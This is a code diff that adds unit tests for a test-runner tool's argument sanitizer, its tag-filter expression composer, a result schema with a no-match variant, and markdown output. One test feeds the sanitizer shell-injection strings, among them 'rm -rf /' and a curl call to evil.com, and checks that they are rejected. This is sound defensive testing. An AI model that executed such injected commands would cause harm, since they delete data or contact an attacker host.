@@ -1,9 +1,15 @@
 import { Writable } from "node:stream";
+import { Schema } from "effect";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import type { RunTestsResultType, TagFilterType } from "../src/tools/run-tests.js";
 import {
+	RunTestsResult,
 	coerceErrors,
+	composeTagExpression,
+	formatNoMatchMarkdown,
 	formatReportJson,
 	formatReportMarkdown,
+	formatRunTestsMarkdown,
 	sanitizeTestArgs,
 	withStdioCaptured,
 } from "../src/tools/run-tests.js";
@@ -37,6 +43,158 @@ describe("sanitizeTestArgs", () => {
 		expect(sanitizeTestArgs(["./packages/reporter/src/utils/ansi.test.ts"])).toEqual([
 			"./packages/reporter/src/utils/ansi.test.ts",
 		]);
+	});
+
+	it("rejects shell-metachar injection in tag values", () => {
+		expect(() => sanitizeTestArgs(["int;rm -rf /"])).toThrow();
+		expect(() => sanitizeTestArgs(["unit`whoami`"])).toThrow();
+		expect(() => sanitizeTestArgs(["e2e$(curl evil.com)"])).toThrow();
+	});
+
+	it("allows simple alphanumeric tag values", () => {
+		expect(sanitizeTestArgs(["int", "e2e-slow", "unit_fast"])).toEqual(["int", "e2e-slow", "unit_fast"]);
+	});
+});
+
+describe("composeTagExpression", () => {
+	it("returns null when given null", () => {
+		expect(composeTagExpression(null)).toBeNull();
+	});
+
+	it("returns null when given undefined", () => {
+		expect(composeTagExpression(undefined)).toBeNull();
+	});
+
+	it("returns null when every sub-filter is empty or absent", () => {
+		expect(composeTagExpression({})).toBeNull();
+		expect(composeTagExpression({ all: [], any: [], none: [] })).toBeNull();
+	});
+
+	it("composes a single all filter joined by 'and'", () => {
+		expect(composeTagExpression({ all: ["int"] })).toBe("int");
+		expect(composeTagExpression({ all: ["int", "slow"] })).toBe("int and slow");
+	});
+
+	it("composes a single any filter joined by 'or' inside parentheses when 2+", () => {
+		expect(composeTagExpression({ any: ["unit"] })).toBe("unit");
+		expect(composeTagExpression({ any: ["unit", "int"] })).toBe("(unit or int)");
+		expect(composeTagExpression({ any: ["unit", "int", "e2e"] })).toBe("(unit or int or e2e)");
+	});
+
+	it("composes a single none filter as 'not <tag> and not <tag>'", () => {
+		expect(composeTagExpression({ none: ["slow"] })).toBe("not slow");
+		expect(composeTagExpression({ none: ["slow", "flaky"] })).toBe("not slow and not flaky");
+	});
+
+	it("joins all three sub-filters with 'and'", () => {
+		expect(
+			composeTagExpression({
+				all: ["int"],
+				any: ["fast", "slow"],
+				none: ["flaky"],
+			}),
+		).toBe("int and (fast or slow) and not flaky");
+	});
+
+	it("matches the spec's worked example for 'int and not slow'", () => {
+		expect(composeTagExpression({ all: ["int"], none: ["slow"] })).toBe("int and not slow");
+	});
+});
+
+describe("RunTestsResult schema with no-match", () => {
+	it("round-trips a no-match variant", async () => {
+		const payload: RunTestsResultType = {
+			kind: "no-match",
+			filter: {
+				project: "core",
+				files: ["packages/core/__test__/empty.test.ts"],
+				tags: { all: ["e2e"] },
+				resolvedExpression: "e2e",
+			},
+		};
+		// Encode then decode — the schema accepts the new branch.
+		const encoded = Schema.encodeUnknownSync(RunTestsResult)(payload);
+		const decoded = Schema.decodeUnknownSync(RunTestsResult)(encoded);
+		expect(decoded.kind).toBe("no-match");
+		if (decoded.kind !== "no-match") return;
+		expect(decoded.filter.project).toBe("core");
+		expect(decoded.filter.files).toEqual(["packages/core/__test__/empty.test.ts"]);
+		expect(decoded.filter.resolvedExpression).toBe("e2e");
+	});
+
+	it("accepts the existing ok / timeout / error variants", () => {
+		const okEnc = Schema.decodeUnknownSync(RunTestsResult)({
+			kind: "ok",
+			report: {
+				timestamp: "2026-05-15T00:00:00.000Z",
+				reason: "passed",
+				summary: { total: 0, passed: 0, failed: 0, skipped: 0, duration: 0 },
+				failed: [],
+				unhandledErrors: [],
+				failedFiles: [],
+			},
+			classifications: {},
+		});
+		expect(okEnc.kind).toBe("ok");
+		const timeoutEnc = Schema.decodeUnknownSync(RunTestsResult)({ kind: "timeout", timeoutSeconds: 120 });
+		expect(timeoutEnc.kind).toBe("timeout");
+		const errorEnc = Schema.decodeUnknownSync(RunTestsResult)({ kind: "error", message: "boom" });
+		expect(errorEnc.kind).toBe("error");
+	});
+});
+
+describe("formatNoMatchMarkdown", () => {
+	it("renders the resolved filter context and tag-introspection remediation", () => {
+		const tags: TagFilterType = { all: ["e2e"] };
+		const md = formatNoMatchMarkdown({
+			project: "core",
+			files: ["packages/core/__test__/empty.test.ts"],
+			tags,
+			resolvedExpression: "e2e",
+		});
+		expect(md).toContain("No tests matched the filter");
+		expect(md).toContain("project: `core`");
+		expect(md).toContain("packages/core/__test__/empty.test.ts");
+		expect(md).toContain("tags.all:");
+		expect(md).toContain("resolved expression: `e2e`");
+		expect(md).toContain('inventory({ kind: "tag" })');
+		expect(md).toContain('test({ action: "for_tag"');
+	});
+
+	it("omits the tag-specific remediation when no tag filter was supplied", () => {
+		const md = formatNoMatchMarkdown({
+			project: "core",
+			files: ["missing.test.ts"],
+			tags: null,
+			resolvedExpression: null,
+		});
+		expect(md).toContain("project: `core`");
+		expect(md).not.toContain('action: "for_tag"');
+		expect(md).toContain('action: "for_file"');
+	});
+
+	it("renders a placeholder when no filter context exists", () => {
+		const md = formatNoMatchMarkdown({
+			project: null,
+			files: [],
+			tags: null,
+			resolvedExpression: null,
+		});
+		expect(md).toContain("(no filter recorded)");
+	});
+
+	it("is reachable through formatRunTestsMarkdown's no-match branch", () => {
+		const md = formatRunTestsMarkdown({
+			kind: "no-match",
+			filter: {
+				project: null,
+				files: [],
+				tags: { none: ["slow"] },
+				resolvedExpression: "not slow",
+			},
+		});
+		expect(md).toContain("No tests matched the filter");
+		expect(md).toContain("tags.none:");
 	});
 });
 
